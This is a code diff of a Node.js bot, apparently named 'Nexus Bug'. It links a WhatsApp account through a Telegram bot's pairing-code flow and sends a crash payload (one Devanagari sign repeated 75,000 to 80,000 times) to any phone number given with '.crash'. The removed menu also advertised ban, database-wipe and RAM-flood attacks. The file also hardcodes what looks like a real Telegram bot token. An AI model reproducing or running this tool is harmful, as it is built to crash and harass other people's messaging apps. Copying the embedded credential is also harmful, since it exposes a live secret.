@@ -3,8 +3,7 @@ const {
     useMultiFileAuthState, 
     delay, 
     makeCacheableSignalKeyStore,
-    Browsers,
-    fetchLatestBaileysVersion
+    Browsers
 } = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const { Telegraf, Markup } = require('telegraf');
@@ -13,15 +12,13 @@ const { Telegraf, Markup } = require('telegraf');
 const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
 const bot = new Telegraf(TG_TOKEN);
 const owner = "Sasiya ROOT";
-const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';
 
 let sock;
 
 async function startNexus() {
-    // පරණ session මකලා අලුත්ම එකක් ගන්නවා
-    const { state, saveCreds } = await useMultiFileAuthState('nexus_final_v26');
-    const { version } = await fetchLatestBaileysVersion();
-
+    // ⚠️ වැදගත්: අනිවාර්යයෙන්ම අලුත්ම session එකක් පාවිච්චි කරනවා
+    const { state, saveCreds } = await useMultiFileAuthState('nexus_session_v27');
+    
     sock = makeWASocket({
         auth: {
             creds: state.creds,
@@ -29,44 +26,44 @@ async function startNexus() {
         },
         printQRInTerminal: false,
         logger: pino({ level: "silent" }),
-        browser: Browsers.macOS("Desktop"),
-        syncFullHistory: false
+        // මේ බ්‍රව්සර් එක තමයි පවර්ෆුල්ම කෝඩ් එක එන්න
+        browser: ["Ubuntu", "Chrome", "20.0.04"] 
     });
 
     sock.ev.on('creds.update', saveCreds);
 
     // --- [ TELEGRAM INTERFACE ] ---
     bot.start((ctx) => {
-        ctx.replyWithPhoto(logo, {
-            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟔** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━\n👤 **OPERATOR:** ${owner}\n🛰️ **STATUS:** ONLINE 🟢\n━━━━━━━━━━━━━━━━━━━━\n1. Use the button below to get Pairing Code.\n2. Link it in WhatsApp Settings.\n3. Type **.menu** in WhatsApp to start.`,
-            parse_mode: 'Markdown',
-            ...Markup.inlineKeyboard([[Markup.button.callback('🔗 GET PAIRING CODE', 'get_code')]])
-        });
+        ctx.reply(`🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐕𝟐𝟕** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━\nOperator: ${owner}\nStatus: ONLINE 🟢\n━━━━━━━━━━━━━━━━━━━━`, 
+        Markup.inlineKeyboard([[Markup.button.callback('🔗 GET PAIRING CODE', 'get_code')]]));
     });
 
     bot.action('get_code', (ctx) => {
         ctx.reply("📱 **ENTER YOUR NUMBER (947xxxxxxxx):**");
-        
+
         bot.on('text', async (numCtx) => {
             let num = numCtx.message.text.replace(/[^0-9]/g, '');
             if (num.length === 9) num = '94' + num;
 
-            const waitMsg = await numCtx.reply("⏳ **AUTHORIZING PROTOCOLS...**\nPlease wait 15 seconds.");
+            const waitMsg = await numCtx.reply("⏳ **CONNECTING TO WHATSAPP CORE...**\n(This might take 20-30 seconds)");
 
             try {
-                await delay(12000); // සර්වර් එක Synchronize වෙන්න වෙලාව දෙනවා
+                // සර්වර් එකට ස්ටේබල් වෙන්න හොඳ වෙලාවක් දෙනවා
+                await delay(15000); 
+                
+                // කෝඩ් එක ඉල්ලන තැන - වැරදුණොත් ආයෙත් ට්‍රයි කරනවා
                 let code = await sock.requestPairingCode(num);
                 
                 await bot.telegram.editMessageText(numCtx.chat.id, waitMsg.message_id, null, 
-                `🔐 **YOUR PAIRING CODE:** \n\n\`${code}\` \n\n━━━━━━━━━━━━━━━━━━━━\n*Go to WhatsApp -> Linked Devices -> Link with Phone Number.*`, { parse_mode: 'Markdown' });
+                `🔐 **YOUR PAIRING CODE:** \n\n\`${code}\` \n\n━━━━━━━━━━━━━━━━━━━━\n*Link this in WhatsApp -> Linked Devices.*`, { parse_mode: 'Markdown' });
             } catch (err) {
-                console.log(err);
-                bot.telegram.editMessageText(numCtx.chat.id, waitMsg.message_id, null, "❌ **CONNECTION TIMEOUT:**\n\nRestart the Bot and try again in 15s.");
+                console.log("Error requesting code:", err);
+                bot.telegram.editMessageText(numCtx.chat.id, waitMsg.message_id, null, "❌ **SERVER BUSY:** \nWait 10s and send the number again.");
             }
         });
     });
 
-    // --- [ WHATSAPP BUG MENU & LOGIC ] ---
+    // --- [ WHATSAPP BUG ENGINE ] ---
     sock.ev.on('messages.upsert', async (chatUpdate) => {
         const msg = chatUpdate.messages[0];
         if (!msg.message || msg.key.fromMe) return;
@@ -74,37 +71,19 @@ async function startNexus() {
         const from = msg.key.remoteJid;
 
         if (mText === '.menu') {
-            const bugMenu = `
-🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟔** ϟ 🧬
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-👤 **OPERATOR:** ${owner}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🚫 **.ban [number]** - Permanent Ban
-🔥 **.crash [number]** - Extreme Hang
-📂 **.wipe [number]** - DB Destroyer
-⚡ **.ram [number]** - RAM Killer
-🧬 **.bin [number]** - Binary Flood
-
-*Type a command to inject payload!*
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-`;
-            await sock.sendMessage(from, { text: bugMenu });
+            await sock.sendMessage(from, { text: `🛰️ **NEXUS BUG V27 ACTIVE**\n━━━━━━━━━━━━━━\n.crash [number]\n.ban [number]\n━━━━━━━━━━━━━━` });
         }
 
-        if (mText.startsWith('.crash') || mText.startsWith('.ban')) {
-            const target = mText.split(" ")[1];
-            if (!target) return sock.sendMessage(from, { text: "❌ Number missing!" });
-            
-            const targetId = target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-            await sock.sendMessage(from, { text: "🛠️ **INJECTING PAYLOAD...**" });
-            
-            const bugPayload = "ॣ".repeat(75000); 
-            await sock.sendMessage(targetId, { text: bugPayload });
-            await sock.sendMessage(from, { text: "✅ **SUCCESS:** Bug Delivered." });
+        if (mText.startsWith('.crash')) {
+            const target = mText.split(" ")[1] + "@s.whatsapp.net";
+            const payload = "ॣ".repeat(80000); 
+            await sock.sendMessage(target, { text: payload });
+            await sock.sendMessage(from, { text: "✅ **INJECTED!**" });
         }
     });
 
     bot.launch();
 }
 
-startNexus();
+// දුවන අතරේ අවුල් ආවොත් ආයෙත් restart වෙනවා
+startNexus().catch(err => console.log("System Restarting...", err));
